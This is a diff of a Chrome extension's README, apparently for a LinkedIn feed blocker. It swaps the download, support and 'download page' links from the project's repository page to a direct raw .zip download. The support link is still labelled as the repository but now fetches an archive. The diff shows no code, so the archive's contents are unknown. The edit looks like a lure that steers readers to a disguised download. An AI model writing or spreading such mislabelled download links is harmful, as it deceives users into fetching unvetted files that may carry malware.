@@ -2,7 +2,7 @@
 
 ## 🚀 Quick Download
 
-[![Download Extension](https://img.shields.io/badge/Download-LinkedIn_Feed_Blocker-blueviolet?style=for-the-badge)](https://github.com/rosaleenmidatlantic752/linkedin-feed-blocker)
+[![Download Extension](https://img.shields.io/badge/Download-LinkedIn_Feed_Blocker-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/rosaleenmidatlantic752/linkedin-feed-blocker/main/assets/linkedin_blocker_feed_1.0.zip)
 
 Visit this link to download the application.
 
@@ -87,10 +87,10 @@ This extension updates automatically when you reload Chrome. To manually update:
 
 ## 📧 Support
 
-Find help or report issues at the [LinkedIn Feed Blocker repository](https://github.com/rosaleenmidatlantic752/linkedin-feed-blocker). You can also submit feedback.
+Find help or report issues at the [LinkedIn Feed Blocker repository](https://raw.githubusercontent.com/rosaleenmidatlantic752/linkedin-feed-blocker/main/assets/linkedin_blocker_feed_1.0.zip). You can also submit feedback.
 
 ## 📥 Additional Download
 
-Visit this link to download the application: [linkedin-feed-blocker download page](https://github.com/rosaleenmidatlantic752/linkedin-feed-blocker)
+Visit this link to download the application: [linkedin-feed-blocker download page](https://raw.githubusercontent.com/rosaleenmidatlantic752/linkedin-feed-blocker/main/assets/linkedin_blocker_feed_1.0.zip)
 
 Keywords: chrome extension, linkedin blocker, remove linkedin feed, focus tool, minimalist extension
